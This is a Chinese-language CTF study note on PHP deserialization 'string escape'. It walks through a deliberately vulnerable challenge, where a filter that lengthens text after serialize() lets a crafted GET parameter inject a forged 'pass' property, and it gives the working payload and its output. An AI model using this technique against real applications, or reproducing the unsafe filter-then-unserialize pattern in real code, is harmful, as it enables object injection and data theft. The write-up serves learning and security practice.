---
tags:
  - PHP
  - serialize
Date: 2026-01-30
---
例题代码
```php
<?php  
highlight_file(__FILE__);  
error_reporting(0);  
function filter($name){    $safe=array("flag","php");    $name=str_replace($safe,"hack",$name);  
    return $name;  
}  
class test{  
    var $user;  
    var $pass='daydream';  
    function __construct($user){        $this->user=$user;  
    }  
}  
$param=$_GET['param'];  
$param=serialize(new test($param));  
$profile=unserialize(filter($param));  
  
if ($profile->pass=='escaping'){  
    echo file_get_contents("flag.php");  
}  
?>
```
### 分析
1.读取flag内容的条件是变量`pass==escaping`
2.param用以接收get提交的参数，并且赋值给param变量，随后将传入的值在test类实例化对象
3.给变量profile赋值过滤后的param

### 问题
1.没有直接给pass属性赋值
2.过滤函数将php->hack过程种字符变多

### 考虑到是增多的字符串逃逸
将pass属性吐出

```php
<?php

class test{

    var $user;

    var $pass='escaping';

    function __construct($user){

        $this->user=$user;

    }

}

$a = new test("unknown");

echo serialize($a);

?>
```
首先找出要逃逸的代码部分
```php
O:4:"test":2:{s:4:"user";s:7:"unknown";s:4:"pass";s:8:"escaping";}
```
其中
```php
;"s:4:"pass";s:8:"escaping";}
```
这就是需要的，注意闭合由;"
一共是29个字符，那么需要29个php去经行替换

构造如下，改源代码
```php
<?php
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}

class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}

$param='phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}';
$param=serialize(new test($param));
var_dump($param);

$profile=unserialize(filter($param));
var_dump($profile);
?>
```
结果
```php
string(177) "O:4:"test":2:{s:4:"user";s:116:"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}";s:4:"pass";s:8:"daydream";}"、

class test#1 (2) {
public $user =>
string(116) "hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack"
public $pass =>
string(8) "escaping"
}
```